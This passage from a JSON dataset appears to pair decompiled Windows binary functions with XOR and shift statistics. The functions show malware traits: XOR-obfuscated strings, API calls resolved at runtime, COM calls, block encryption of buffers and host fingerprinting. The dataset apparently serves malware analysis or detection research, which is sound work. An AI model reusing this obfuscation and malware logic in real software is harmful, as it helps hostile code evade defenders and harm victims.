LOBYTE(STACK[0x184]) = 37;\n            LOBYTE(STACK[0x185]) = sub_401120(&STACK[0x184], 107);\n            LOBYTE(STACK[0x186]) = sub_401120(&STACK[0x184], 101);\n            LOBYTE(STACK[0x187]) = sub_401120(&STACK[0x184], 114);\n            LOBYTE(STACK[0x188]) = sub_401120(&STACK[0x184], 110);\n            LOBYTE(STACK[0x189]) = sub_401120(&STACK[0x184], 101);\n            LOBYTE(STACK[0x18A]) = sub_401120(&STACK[0x184], 108);\n            LOBYTE(STACK[0x18B]) = sub_401120(&STACK[0x184], 51);\n            LOBYTE(STACK[0x18C]) = sub_401120(&STACK[0x184], 50);\n            v560 = 0;\n            LOBYTE(STACK[0x18D]) = 0;\n            do\n            {\n              v596 = *sub_401010((char *)&STACK[0x185], v560);\n              v561 = sub_401010((char *)&STACK[0x185], v560++);\n              *v561 = sub_401120(&STACK[0x184], v596);\n            }\n            while ( v560 < 8 );\n            *sub_401010((char *)&STACK[0x185], 8) = 0;\n            v562 = (const CHAR *)sub_401000(&STACK[0x185]);\n            v571 = lpProcName;\n            v563 = GetModuleHandleA(v562);\n            v564 = GetProcAddress(v563, v571);\n            if ( v564 )\n              ((void (__stdcall *)(unsigned int))v564)(STACK[0x86C]);\n          }\n          ExitThread(0);\n        }\n      }\n    }\n  }\n}\n// 40DB8B: variable '_0' is possibly undefined\n// 40DB80: too many input arguments, some ignored\n// 4243D0: using guessed type __int128 xmmword_4243D0;\n// 424430: using guessed type __int128 xmmword_424430;\n// 424440: using guessed type __int128 xmmword_424440;\n// 424450: using guessed type __int128 xmmword_424450;\n// 424510: using guessed type __int128 xmmword_424510;\n// 424580: using guessed type __int128 xmmword_424580;\n// 424600: using guessed type __int128 xmmword_424600;\n// 424630: using guessed type __int128 xmmword_424630;\n// 424650: using guessed type __int128 xmmword_424650;\n// 4246C0: using guessed type __int128 xmmword_4246C0;\n// 424710: using guessed type __int128 xmmword_424710;\n// 424720: using guessed type __int128 xmmword_424720;\n// 424760: using guessed type __int128 xmmword_424760;\n// 424AD0: using guessed type __int128 xmmword_424AD0;\n// 424B20: using guessed type __int128 xmmword_424B20;\n// 424B40: using guessed type __int128 xmmword_424B40;\n// 424C20: using guessed type __int128 xmmword_424C20;\n// 424C80: using guessed type __int128 xmmword_424C80;\n// 424C90: using guessed type __int128 xmmword_424C90;\n// 424CA0: using guessed type __int128 xmmword_424CA0;\n// 424CB0: using guessed type __int128 xmmword_424CB0;\n// 424CC0: using guessed type __int128 xmmword_424CC0;\n// 424CD0: using guessed type __int128 xmmword_424CD0;\n// 424CE0: using guessed type __int128 xmmword_424CE0;\n// 424D00: using guessed type __int128 xmmword_424D00;\n// 424D20: using guessed type __int128 xmmword_424D20;\n// 424D30: using guessed type __int128 xmmword_424D30;\n// 424D40: using guessed type __int128 xmmword_424D40;\n// 424D60: using guessed type __int128 xmmword_424D60;\n// 424D80: using guessed type __int128 xmmword_424D80;\n// 424DE0: using guessed type __int128 xmmword_424DE0;\n// 424DF0: using guessed type __int128 xmmword_424DF0;\n// 424E00: using guessed type __int128 xmmword_424E00;\n// 424E10: using guessed type __int128 xmmword_424E10;\n// 424E40: using guessed type __int128 xmmword_424E40;\n// 424E50: using guessed type __int128 xmmword_424E50;\n// 424E90: using guessed type __int128 xmmword_424E90;\n// 424EA0: using guessed type __int128 xmmword_424EA0;\n\n"
    },
    {
        "Function": "sub_409030",
        "Total XOR and shift operations": 6,
        "XOR operations": 0,
        "Shift operations": 6,
        "Operation percentage": "7.23%",
        "Function Body": "\nint __fastcall sub_409030(char *a1, int *a2)\n{\n  int v4; // edx\n  int v5; // esi\n  unsigned int v6; // ebx\n  unsigned int v7; // eax\n  unsigned int v8; // edx\n  _DWORD v10[130]; // [esp+10h] [ebp-3D8h] BYREF\n  _DWORD v11[80]; // [esp+218h] [ebp-1D0h] BYREF\n  BYTE pbBuffer[104]; // [esp+358h] [ebp-90h] BYREF\n  _DWORD v13[3]; // [esp+3C0h] [ebp-28h] BYREF\n  _DWORD v14[3]; // [esp+3CCh] [ebp-1Ch] BYREF\n  int v15; // [esp+3D8h] [ebp-10h]\n  int *v16; // [esp+3DCh] [ebp-Ch]\n  int v17; // [esp+3E0h] [ebp-8h]\n  unsigned int v18; // [esp+3E4h] [ebp-4h]\n\n  v15 = 0;\n  v16 = a2;\n  sub_403700(v14);\n  sub_403700(v13);\n  sub_4059F0(dword_428E68, 0, 0);\n  if ( !sub_404300((int)v14, &pbBinary, 0x100u)\n    && !sub_404300((int)v13, &unk_427100, 3u)\n    && !sub_405940((int)dword_428E68, (int)v14, 0, 0, 0, (int)v13) )\n  {\n    sub_401A70(v11);\n    sub_401710(v10);\n    sub_40D210(pbBuffer, 0x64u);\n    if ( !sub_401C70(v11, (int)sub_4015E0, (int)v10, pbBuffer, 0x64u) )\n    {\n      v4 = (unsigned __int64)(1121950641i64 * *a2) >> 32;\n      v5 = 0;\n      v18 = *a2;\n      v6 = 245;\n      v17 = 0;\n      if ( (v4 >> 6) + ((unsigned int)v4 >> 31) + 1 )\n      {\n        while ( !sub_405A20(\n                   dword_428E68,\n                   (void (__cdecl *)(int, unsigned int, unsigned int))sub_401A90,\n                   (int)v11,\n                   0,\n                   v6,\n                   a1,\n                   &Data[v5]) )\n        {\n          v7 = v18;\n          if ( v18 >= 0xF5 )\n            v7 = v6;\n          v6 = v7;\n          v18 -= 245;\n          a1 += 245;\n          v8 = (int)((unsigned __int64)(1121950641i64 * *v16) >> 32) >> 6;\n          v5 += 256;\n          if ( ++v17 == v8 + (v8 >> 31) + 1 )\n            goto LABEL_10;\n        }\n      }\n      else\n      {\nLABEL_10:\n        v15 = 1;\n        *v16 = v5;\n      }\n    }\n  }\n  sub_402FF0((int)v14);\n  sub_402FF0((int)v13);\n  sub_4055C0((int)dword_428E68);\n  sub_401A40((int)v11);\n  sub_4015A0(v10);\n  return v15;\n}\n// 428960: using guessed type BYTE Data[1280];\n// 428E68: using guessed type int dword_428E68[43];\n// 409030: using guessed type _DWORD var_1C[3];\n// 409030: using guessed type _DWORD var_28[3];\n// 409030: using guessed type _DWORD var_1D0[80];\n// 409030: using guessed type _DWORD var_3D8[130];\n\n"
    },
    {
        "Function": "sub_41ECA0",
        "Total XOR and shift operations": 18,
        "XOR operations": 18,
        "Shift operations": 0,
        "Operation percentage": "4.60%",
        "Function Body": "\nBOOL __thiscall sub_41ECA0(void *this)\n{\n  HRESULT v2; // ebx\n  unsigned int i; // ecx\n  HRESULT v4; // esi\n  void *v5; // edx\n  unsigned int j; // ecx\n  unsigned int k; // ecx\n  unsigned int v8; // eax\n  void *v9; // ecx\n  int v11[9]; // [esp+Eh] [ebp-14Ah] BYREF\n  __int16 v12; // [esp+32h] [ebp-126h]\n  __int16 v13; // [esp+34h] [ebp-124h]\n  __int16 v14; // [esp+36h] [ebp-122h]\n  __int16 v15; // [esp+38h] [ebp-120h]\n  __int16 v16; // [esp+3Ah] [ebp-11Eh]\n  __int16 v17; // [esp+3Ch] [ebp-11Ch]\n  __int16 v18; // [esp+3Eh] [ebp-11Ah]\n  __int16 v19; // [esp+40h] [ebp-118h]\n  __int16 v20; // [esp+42h] [ebp-116h]\n  __int16 v21; // [esp+44h] [ebp-114h]\n  __int16 v22; // [esp+46h] [ebp-112h]\n  __int16 v23; // [esp+48h] [ebp-110h]\n  __int16 v24; // [esp+4Ah] [ebp-10Eh]\n  __int16 v25; // [esp+4Ch] [ebp-10Ch]\n  __int16 v26; // [esp+4Eh] [ebp-10Ah]\n  __int16 v27; // [esp+50h] [ebp-108h]\n  __int16 v28; // [esp+52h] [ebp-106h]\n  __int16 v29; // [esp+54h] [ebp-104h]\n  __int16 v30; // [esp+56h] [ebp-102h]\n  void *v31; // [esp+58h] [ebp-100h] BYREF\n  int v32[22]; // [esp+5Eh] [ebp-FAh] BYREF\n  int v33; // [esp+B6h] [ebp-A2h] BYREF\n  int v34; // [esp+BAh] [ebp-9Eh]\n  int v35; // [esp+BEh] [ebp-9Ah]\n  int v36; // [esp+C2h] [ebp-96h]\n  int v37; // [esp+C6h] [ebp-92h]\n  int v38; // [esp+CAh] [ebp-8Eh]\n  int v39; // [esp+CEh] [ebp-8Ah]\n  int v40; // [esp+D2h] [ebp-86h]\n  int v41; // [esp+D6h] [ebp-82h]\n  int v42; // [esp+DAh] [ebp-7Eh]\n  int v43; // [esp+DEh] [ebp-7Ah]\n  int v44; // [esp+E2h] [ebp-76h]\n  int v45; // [esp+E6h] [ebp-72h]\n  int v46; // [esp+EAh] [ebp-6Eh]\n  int v47; // [esp+EEh] [ebp-6Ah]\n  int v48; // [esp+F2h] [ebp-66h]\n  int v49; // [esp+F6h] [ebp-62h]\n  int v50; // [esp+FAh] [ebp-5Eh]\n  int v51; // [esp+FEh] [ebp-5Ah]\n  int v52; // [esp+102h] [ebp-56h]\n  __int16 v53; // [esp+106h] [ebp-52h]\n  __int16 v54; // [esp+108h] [ebp-50h]\n  __int16 v55; // [esp+10Ah] [ebp-4Eh]\n  __int16 v56; // [esp+10Ch] [ebp-4Ch]\n  __int16 v57; // [esp+10Eh] [ebp-4Ah]\n  __int16 v58; // [esp+110h] [ebp-48h]\n  __int16 v59; // [esp+112h] [ebp-46h]\n  __int16 v60; // [esp+114h] [ebp-44h]\n  __int16 v61; // [esp+116h] [ebp-42h]\n  __int16 v62; // [esp+118h] [ebp-40h]\n  __int16 v63; // [esp+11Ah] [ebp-3Eh]\n  __int16 v64; // [esp+11Ch] [ebp-3Ch]\n  __int16 v65; // [esp+11Eh] [ebp-3Ah]\n  __int16 v66; // [esp+120h] [ebp-38h]\n  __int16 v67; // [esp+122h] [ebp-36h]\n  __int16 v68; // [esp+124h] [ebp-34h]\n  __int16 v69; // [esp+126h] [ebp-32h]\n  __int16 v70; // [esp+128h] [ebp-30h]\n  __int16 v71; // [esp+12Ah] [ebp-2Eh]\n  __int16 v72; // [esp+12Ch] [ebp-2Ch]\n  __int16 v73; // [esp+12Eh] [ebp-2Ah]\n  __int16 v74; // [esp+130h] [ebp-28h]\n  __int16 v75; // [esp+132h] [ebp-26h]\n  __int16 v76; // [esp+134h] [ebp-24h]\n  __int16 v77; // [esp+136h] [ebp-22h]\n  __int16 v78; // [esp+138h] [ebp-20h]\n  __int16 v79; // [esp+13Ah] [ebp-1Eh]\n  __int16 v80; // [esp+13Ch] [ebp-1Ch]\n  __int16 v81; // [esp+13Eh] [ebp-1Ah]\n  __int16 v82; // [esp+140h] [ebp-18h]\n  __int16 v83; // [esp+142h] [ebp-16h]\n  __int16 v84; // [esp+144h] [ebp-14h]\n  __int16 v85; // [esp+146h] [ebp-12h]\n  __int16 v86; // [esp+148h] [ebp-10h]\n  __int16 v87; // [esp+14Ah] [ebp-Eh]\n  __int16 v88; // [esp+14Ch] [ebp-Ch]\n  __int16 v89; // [esp+14Eh] [ebp-Ah]\n  __int16 v90; // [esp+150h] [ebp-8h]\n  __int16 v91; // [esp+152h] [ebp-6h]\n  void *v92; // [esp+154h] [ebp-4h] BYREF\n\n  v31 = 0;\n  v92 = 0;\n  v2 = CoInitializeEx(0, 2u);\n  v33 = 3014741;\n  v34 = 1048678;\n  v53 = 85;\n  v35 = 1245280;\n  v54 = 17;\n  v36 = 6422550;\n  v55 = 60;\n  v37 = 7077907;\n  v56 = 38;\n  v38 = 7078008;\n  v57 = 37;\n  v39 = 6291476;\n  v58 = 57;\n  v40 = 7864420;\n  v59 = 52;\n  v41 = 6684769;\n  v60 = 44;\n  v42 = 6422627;\n  v61 = 22;\n  v43 = 7078008;\n  v62 = 52;\n  v44 = 6488165;\n  v63 = 57;\n  v45 = 7864422;\n  v64 = 60;\n  v46 = 6553620;\n  v65 = 55;\n  v47 = 6619239;\n  v66 = 39;\n  v48 = 6357095;\n  v67 = 52;\n  v49 = 1245281;\n  v68 = 33;\n  v50 = 1048599;\n  v51 = 6422550;\n  v52 = 5570600;\n  v69 = 58;\n  v70 = 39;\n  v71 = 85;\n  v72 = 85;\n  v73 = 85;\n  v74 = 6;\n  v75 = 58;\n  v76 = 51;\n  v77 = 33;\n  v78 = 34;\n  v79 = 52;\n  v80 = 39;\n  v81 = 48;\n  v82 = 9;\n  v83 = 24;\n  v84 = 60;\n  v85 = 54;\n  v86 = 39;\n  v87 = 58;\n  v88 = 38;\n  v89 = 58;\n  v90 = 51;\n  v91 = 0;\n  for ( i = 0; i < 0x4D; ++i )\n    *((_WORD *)&v33 + i + 1) = (char)(v33 ^ *((_BYTE *)&v33 + 2 * i + 2));\n  v91 = 0;\n  v4 = sub_41E7E0((_WORD *)&v33 + 1, (const IID *)\"tmn\\auNjt\\tL\", 4, &v31);\n  if ( !v4 )\n  {\n    v5 = v31;\n    if ( !v31 )\n    {\n      v4 = -2147024882;\n      goto LABEL_18;\n    }\n    v11[0] = 7798835;\n    v11[1] = 4194394;\n    v13 = 51;\n    v11[2] = 6225987;\n    v14 = 51;\n    v11[3] = 4849746;\n    v15 = 96;\n    v11[4] = 5374064;\n    v16 = 92;\n    v11[5] = 5898335;\n    v17 = 85;\n    v11[6] = 4259921;\n    v18 = 71;\n    v11[7] = 4653138;\n    v19 = 68;\n    v11[8] = (int)&loc_41005C;\n    v20 = 82;\n    v12 = 51;\n    v21 = 65;\n    v22 = 86;\n    v23 = 111;\n    v24 = 126;\n    v25 = 90;\n    v26 = 80;\n    v27 = 65;\n    v28 = 92;\n    v29 = 64;\n    v30 = 0;\n    for ( j = 0; j < 0x23; ++j )\n      *((_WORD *)v11 + j + 1) = (char)(LOBYTE(v11[0]) ^ *((_BYTE *)v11 + 2 * j + 2));\n    v32[0] = 2162802;\n    v30 = 0;\n    v32[1] = 1310749;\n    v42 = 7471218;\n    v32[2] = 327686;\n    v32[3] = 19;\n    v43 = 589938;\n    v32[4] = 3014679;\n    v32[5] = 1769535;\n    v44 = 4194358;\n    v32[6] = 17;\n    v32[7] = 65565;\n    v45 = 4522039;\n    v32[8] = 1310749;\n    v32[9] = 3014662;\n    v46 = 4587586;\n    v32[10] = 1769509;\n    v32[11] = 1441820;\n    v47 = 3145795;\n    v32[12] = 327709;\n    v32[13] = 5373953;\n    v48 = 4194399;\n    v32[14] = 2490428;\n    v32[15] = 3211310;\n    v49 = 4194379;\n    v32[16] = 7;\n    v32[17] = 1507328;\n    v32[18] = 393244;\n    v32[19] = 1507364;\n    v32[20] = 0x10000;\n    v32[21] = 1900571;\n    v33 = 3014684;\n    v34 = 3211323;\n    v35 = 3014719;\n    v36 = 1245233;\n    v37 = 1769502;\n    v38 = 16;\n    v39 = 393235;\n    v40 = 1900571;\n    v41 = 7471132;\n    v50 = 6225989;\n    v51 = 4194374;\n    v52 = 1048596;\n    v53 = 95;\n    v54 = 74;\n    v55 = 55;\n    v56 = 75;\n    v57 = 52;\n    v58 = 95;\n    v59 = 69;\n    v60 = 49;\n    v61 = 55;\n    v62 = 75;\n    v63 = 65;\n    v64 = 48;\n    v65 = 68;\n    v66 = 54;\n    v67 = 49;\n    v68 = 75;\n    v69 = 65;\n    v70 = 69;\n    v71 = 15;\n    v72 = 114;\n    v73 = 114;\n    v74 = 4338;\n    v75 = 50;\n    v76 = 4178;\n    v77 = 50;\n    v78 = -11801;\n    v79 = 2660;\n    v80 = 28469;\n    v81 = 18710;\n    v82 = -30752;\n    v83 = 19437;\n    v84 = 28121;\n    v85 = 10218;\n    v86 = *(_WORD *)\"tmn\\auNjt\\tL\" ^ 0x72;\n    v87 = *(_WORD *)\"n\\auNjt\\tL\" ^ 0x72;\n    v88 = *(_WORD *)\"\\auNjt\\tL\" ^ 0x72;\n    v89 = *(_WORD *)\"uNjt\\tL\" ^ 0x72;\n    v90 = *(_WORD *)\"jt\\tL\" ^ 0x72;\n    v91 = 0;\n    for ( k = 0; k < 0x79; ++k )\n      *((_WORD *)v32 + k + 1) = (char)(LOBYTE(v32[0]) ^ *((_BYTE *)v32 + 2 * k + 2));\n    v91 = 0;\n    v4 = (*(int (__stdcall **)(void *, int, char *, char *, void *))(*(_DWORD *)v5 + 40))(\n           v5,\n           -2147483646,\n           (char *)v32 + 2,\n           (char *)v11 + 2,\n           this);\n    if ( v4 >= 0 )\n    {\n      v33 = 4390968;\n      v53 = 56;\n      v34 = 655484;\n      v54 = 4280;\n      v35 = 983165;\n      v55 = 120;\n      v36 = 786440;\n      v56 = 4120;\n      v37 = 7995401;\n      v57 = 120;\n      v38 = 655381;\n      v58 = -11859;\n      v39 = 655361;\n      v59 = 2606;\n      v40 = 1376271;\n      v60 = 28543;\n      v41 = 655372;\n      v61 = 18780;\n      v42 = 5898334;\n      v62 = -30806;\n      v43 = 21;\n      v63 = 19367;\n      v44 = 65661;\n      v64 = 28051;\n      v45 = 1376382;\n      v65 = 10144;\n      v46 = 8060943;\n      v66 = *(_WORD *)\"tmn\\auNjt\\tL\" ^ 0x38;\n      v47 = 65661;\n      v67 = *(_WORD *)\"n\\auNjt\\tL\" ^ 0x38;\n      v48 = 7995403;\n      v68 = *(_WORD *)\"\\auNjt\\tL\" ^ 0x38;\n      v49 = 8126478;\n      v69 = *(_WORD *)\"uNjt\\tL\" ^ 0x38;\n      v50 = 65659;\n      v70 = *(_WORD *)\"jt\\tL\" ^ 0x38;\n      v51 = 983051;\n      v71 = *(_WORD *)\"t\\tL\" ^ 0x38;\n      v52 = 3670085;\n      v72 = *(_WORD *)\"\\tL\" ^ 0x38;\n      v73 = *(_WORD *)\"L\" ^ 0x38;\n      v74 = *(_WORD *)\"\" ^ 0x38;\n      v75 = 56;\n      v76 = 56;\n      v77 = 56;\n      v78 = 7275;\n      v79 = 26936;\n      v80 = 1099;\n      v81 = 15618;\n      v82 = 25163;\n      v83 = 29531;\n      v84 = 312;\n      v85 = 61;\n      v86 = 14168;\n      v87 = 3129;\n      v88 = 4148;\n      v89 = 4153;\n      v90 = 4669;\n      v8 = 0;\n      v91 = 0;\n      do\n      {\n        *((_WORD *)&v33 + v8 + 1) = (char)(v33 ^ *((_BYTE *)&v33 + 2 * v8 + 2));\n        ++v8;\n      }\n      while ( v8 < 0x4D );\n      v91 = 0;\n      v4 = sub_41E7E0((_WORD *)&v33 + 1, (const IID *)&word_424368, 4, &v92);\n      if ( !v4 )\n      {\n        v9 = v92;\n        if ( !v92 )\n        {\n          v4 = -2147024882;\n          goto LABEL_16;\n        }\n        v4 = (*(int (__thiscall **)(void *, void *, _DWORD))(*(_DWORD *)v92 + 56))(v92, v92, 0);\n      }\n    }\n  }\n  v9 = v92;\nLABEL_16:\n  if ( !v31 )\n    goto LABEL_19;\n  (*(void (__stdcall **)(void *))(*(_DWORD *)v31 + 8))(v31);\nLABEL_18:\n  v9 = v92;\nLABEL_19:\n  if ( v9 )\n    (*(void (__thiscall **)(void *, void *))(*(_DWORD *)v9 + 8))(v9, v9);\n  if ( !v2 )\n    CoUninitialize();\n  return v4 >= 0;\n}\n// 424360: using guessed type int (__stdcall *off_424360)(int);\n// 424368: using guessed type __int16 word_424368;\n// 424390: using guessed type __int128 xmmword_424390;\n// 4243A0: using guessed type __int128 xmmword_4243A0;\n\n"
    },
    {
        "Function": "sub_40D370",
        "Total XOR and shift operations": 12,
        "XOR operations": 12,
        "Shift operations": 0,
        "Operation percentage": "3.37%",
        "Function Body": "\nint sub_40D370()\n{\n  DWORD v0; // eax\n  DWORDLONG v1; // rdi\n  BOOL v2; // eax\n  DWORD dwMinorVersion; // ecx\n  unsigned int v4; // ecx\n  int v5; // eax\n  unsigned int v6; // ecx\n  CHAR v7; // cl\n  int v8; // eax\n  unsigned int v9; // ecx\n  unsigned int v10; // ecx\n  unsigned int v11; // ecx\n  char v12; // cl\n  unsigned int v13; // eax\n  DWORD v14; // eax\n  unsigned int v15; // ecx\n  unsigned int v16; // ecx\n  char v17; // cl\n  CHAR v18; // cl\n  int v19; // eax\n  char v20; // cl\n  unsigned int v21; // ecx\n  WORD wDay; // dx\n  WORD wMonth; // bx\n  int v24; // esi\n  struct _OSVERSIONINFOEXW v26; // [esp+10h] [ebp-338h] BYREF\n  CHAR Buffer[68]; // [esp+130h] [ebp-218h] BYREF\n  struct _SYSTEM_INFO SystemInfo; // [esp+174h] [ebp-1D4h] BYREF\n  struct _OSVERSIONINFOA VersionInformation; // [esp+198h] [ebp-1B0h] BYREF\n  char v30; // [esp+232h] [ebp-116h]\n  CHAR v31[16]; // [esp+238h] [ebp-110h] BYREF\n  CHAR v32[16]; // [esp+248h] [ebp-100h] BYREF\n  struct _SYSTEMTIME SystemTime; // [esp+258h] [ebp-F0h] BYREF\n  char v34[18]; // [esp+269h] [ebp-DFh] BYREF\n  __int128 v35; // [esp+27Bh] [ebp-CDh] BYREF\n  __int16 v36; // [esp+28Bh] [ebp-BDh]\n  CHAR v37[16]; // [esp+28Dh] [ebp-BBh] BYREF\n  __int16 v38; // [esp+29Dh] [ebp-ABh]\n  CHAR v39[16]; // [esp+29Fh] [ebp-A9h] BYREF\n  char v40[9]; // [esp+2AFh] [ebp-99h] BYREF\n  int v41; // [esp+2B8h] [ebp-90h] BYREF\n  _BYTE v42[20]; // [esp+2BEh] [ebp-8Ah] BYREF\n  char v43[5]; // [esp+2D2h] [ebp-76h] BYREF\n  _DWORD v44[3]; // [esp+2D7h] [ebp-71h] BYREF\n  char v45[3]; // [esp+2E3h] [ebp-65h] BYREF\n  _DWORD v46[3]; // [esp+2E6h] [ebp-62h] BYREF\n  __int16 v47; // [esp+2F2h] [ebp-56h]\n  CHAR v48[4]; // [esp+2F4h] [ebp-54h] BYREF\n  int v49; // [esp+2F8h] [ebp-50h]\n  int v50; // [esp+2FCh] [ebp-4Ch]\n  char v51; // [esp+300h] [ebp-48h]\n  CHAR v52[4]; // [esp+301h] [ebp-47h] BYREF\n  _BYTE v53[21]; // [esp+305h] [ebp-43h] BYREF\n  char v54[12]; // [esp+31Ah] [ebp-2Eh] BYREF\n  char v55[11]; // [esp+326h] [ebp-22h] BYREF\n  char v56[11]; // [esp+331h] [ebp-17h] BYREF\n  LPBYTE v57[2]; // [esp+33Ch] [ebp-Ch] BYREF\n  char v58; // [esp+346h] [ebp-2h]\n  char v59; // [esp+347h] [ebp-1h]\n\n  v41 = 0;\n  sub_40CE50(&v41);\n  sub_40CC00(&VersionInformation.dwMajorVersion, 0, 0x98u);\n  VersionInformation.dwOSVersionInfoSize = 156;\n  GetVersionExA(&VersionInformation);\n  v57[1] = 0;\n  if ( NetWkstaGetInfo(0, 0x64u, &v57[1]) )\n  {\n    if ( VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion == 2 )\n    {\n      v1 = VerSetConditionMask(0i64, 1u, 1u);\n      sub_40CC00(&v26, 0, 0x11Cu);\n      v26.dwOSVersionInfoSize = 284;\n      v26.dwMinorVersion = 3;\n      v2 = VerifyVersionInfoW(&v26, 1u, v1);\n      dwMinorVersion = VersionInformation.dwMinorVersion;\n      if ( v2 )\n        dwMinorVersion = 3;\n      VersionInformation.dwMinorVersion = dwMinorVersion;\n    }\n  }\n  else\n  {\n    v0 = *((_DWORD *)v57[1] + 4);\n    VersionInformation.dwMajorVersion = *((_DWORD *)v57[1] + 3);\n    VersionInformation.dwMinorVersion = v0;\n  }\n  GetSystemInfo(&SystemInfo);\n  if ( VersionInformation.dwMajorVersion == 10 )\n  {\n    if ( v30 == 1 )\n    {\n      strcpy(v54, \"ROS: Win 10\");\n      v58 = 99;\n      v59 = 98;\n      v5 = sub_40A0B0(&v54[1]);\n      LOBYTE(v5) = 2;\n    }\n    else\n    {\n      v4 = 0;\n      *(_OWORD *)v32 = xmmword_424390;\n      do\n        v32[++v4] ^= v32[0];\n      while ( v4 < 0xE );\n      v32[15] = 0;\n      v5 = sub_40A0B0(&v32[1]);\n      LOBYTE(v5) = 1;\n    }\n    goto LABEL_66;\n  }\n  if ( VersionInformation.dwMajorVersion == 6 )\n  {\n    switch ( VersionInformation.dwMinorVersion )\n    {\n      case 3u:\n        if ( v30 == 1 )\n        {\n          v7 = 14;\n          *(_DWORD *)v52 = 878526734;\n          strcpy(v53, \".Yg`.6 ?\");\n          v8 = 0;\n          while ( 1 )\n          {\n            v52[v8 + 1] ^= v7;\n            if ( (unsigned int)++v8 >= 0xB )\n              break;\n            v7 = v52[0];\n          }\n          v53[8] = 0;\n          v5 = sub_40A0B0(&v52[1]);\n          LOBYTE(v5) = 4;\n        }\n        else\n        {\n          v6 = 0;\n          *(_OWORD *)v39 = xmmword_424530;\n          strcpy(v40, \"\\t\\x1Bi\\t\");\n          do\n            v39[++v6] ^= v39[0];\n          while ( v6 < 0x13 );\n          v40[4] = 0;\n          v5 = sub_40A0B0(&v39[1]);\n          LOBYTE(v5) = 3;\n        }\n        goto LABEL_66;\n      case 2u:\n        if ( v30 == 1 )\n        {\n          strcpy(v56, \"tOS: Win 8\");\n          v59 = 76;\n          v5 = sub_40A0B0(&v56[1]);\n          LOBYTE(v5) = 6;\n        }\n        else\n        {\n          v9 = 0;\n          *(_OWORD *)v37 = xmmword_424C00;\n          v38 = 95;\n          do\n            v37[++v9] ^= v37[0];\n          while ( v9 < 0x10 );\n          HIBYTE(v38) = 0;\n          v5 = sub_40A0B0(&v37[1]);\n          LOBYTE(v5) = 5;\n        }\n        goto LABEL_66;\n      case 1u:\n        if ( v30 == 1 )\n        {\n          strcpy(v55, \"FOS: Win 7\");\n          v59 = 113;\n          v5 = sub_40A0B0(&v55[1]);\n          LOBYTE(v5) = 8;\n        }\n        else\n        {\n          v10 = 0;\n          *(_OWORD *)&v42[4] = xmmword_424BA0;\n          strcpy(v43, \"QI;[\");\n          do\n            v42[v10++ + 5] ^= v42[4];\n          while ( v10 < 0x13 );\n          v43[4] = 0;\n          v5 = sub_40A0B0(&v42[5]);\n          LOBYTE(v5) = 7;\n        }\n        goto LABEL_66;\n      case 0u:\n        if ( v30 == 1 )\n        {\n          v12 = 60;\n          v44[0] = 107967292;\n          v44[1] = 1381329692;\n          v13 = 0;\n          v44[2] = 1330997788;\n          strcpy(v45, \"H]\");\n          while ( 1 )\n          {\n            *((_BYTE *)v44 + ++v13) ^= v12;\n            if ( v13 >= 0xD )\n              break;\n            v12 = v44[0];\n          }\n          v45[2] = 0;\n          v5 = sub_40A0B0((LPCSTR)v44 + 1);\n          LOBYTE(v5) = 10;\n        }\n        else\n        {\n          v11 = 0;\n          v35 = xmmword_424EB0;\n          v36 = 119;\n          do\n            *((_BYTE *)&v35 + ++v11) ^= v35;\n          while ( v11 < 0x10 );\n          HIBYTE(v36) = 0;\n          v5 = sub_40A0B0((LPCSTR)&v35 + 1);\n          LOBYTE(v5) = 9;\n        }\n        goto LABEL_66;\n    }\n    goto LABEL_62;\n  }\n  if ( VersionInformation.dwMajorVersion != 5 )\n    goto LABEL_62;\n  v14 = VersionInformation.dwMinorVersion;\n  if ( VersionInformation.dwMinorVersion != 2 )\n  {\n    if ( VersionInformation.dwMinorVersion == 1 )\n    {\n      strcpy(&v53[9], \"zOS: Win XP\");\n      v59 = 34;\n      v58 = 42;\n      v5 = sub_40A0B0(&v53[10]);\n      LOBYTE(v5) = 13;\n      goto LABEL_66;\n    }\n    if ( !VersionInformation.dwMinorVersion )\n    {\n      v17 = 38;\n      v46[0] = 477456678;\n      v46[1] = 1213165830;\n      v46[2] = 370545670;\n      v47 = 22;\n      while ( 1 )\n      {\n        *((_BYTE *)v46 + ++v14) ^= v17;\n        if ( v14 >= 0xC )\n          break;\n        v17 = v46[0];\n      }\n      HIBYTE(v47) = 0;\n      v5 = sub_40A0B0((LPCSTR)v46 + 1);\n      LOBYTE(v5) = 14;\n      goto LABEL_66;\n    }\nLABEL_62:\n    v18 = 109;\n    *(_DWORD *)v48 = 1463689837;\n    v49 = 100874317;\n    v19 = 0;\n    v50 = 52036099;\n    v51 = 0;\n    while ( 1 )\n    {\n      v48[v19 + 1] ^= v18;\n      if ( (unsigned int)++v19 >= 0xB )\n        break;\n      v18 = v48[0];\n    }\n    v51 = 0;\n    v5 = sub_40A0B0(&v48[1]);\n    LOBYTE(v5) = 0;\n    goto LABEL_66;\n  }\n  if ( v30 == 1 && SystemInfo.wProcessorArchitecture == 9 )\n  {\n    v15 = 0;\n    *(_OWORD *)v31 = xmmword_4243E0;\n    do\n      v31[++v15] ^= v31[0];\n    while ( v15 < 0xE );\n    v31[15] = 0;\n    v5 = sub_40A0B0(&v31[1]);\n    LOBYTE(v5) = 11;\n  }\n  else\n  {\n    v16 = 0;\n    strcpy(v34, \"\\x1BTH!;Lru;HIM;)++(\");\n    do\n      v34[++v16] ^= v34[0];\n    while ( v16 < 0x10 );\n    v34[17] = 0;\n    v5 = sub_40A0B0(&v34[1]);\n    LOBYTE(v5) = 12;\n  }\nLABEL_66:\n  byte_429260 = v5;\n  LOWORD(v5) = __GS__;\n  v20 = 85;\n  if ( v5 )\n    v20 = 51;\n  byte_429261 = v20;\n  byte_429262 = 4 * (v41 != 0) - 38;\n  GetLocalTime(&SystemTime);\n  v21 = 0;\n  wDay = SystemTime.wDay;\n  wMonth = SystemTime.wMonth;\n  byte_429265 = SystemTime.wMinute;\n  byte_429263 = SystemTime.wDay;\n  byte_429264 = SystemTime.wMonth;\n  byte_429266 = SystemTime.wHour;\n  *(_OWORD *)v42 = xmmword_4244E0;\n  *(_DWORD *)&v42[16] = 50741763;\n  *(_DWORD *)v43 = 1107500098;\n  v43[4] = 0;\n  do\n    v42[++v21] ^= v42[0];\n  while ( v21 < 0x17 );\n  v43[4] = 0;\n  sub_40A0B0(&v42[1], wDay, wMonth, SystemTime.wHour, SystemTime.wMinute);\n  dword_429334 += 7;\n  *(_DWORD *)&v40[5] = 64;\n  if ( GetComputerNameA(Buffer, (LPDWORD)&v40[5]) )\n  {\n    v24 = *(_DWORD *)&v40[5];\n    sub_40CBE0(&unk_429267, 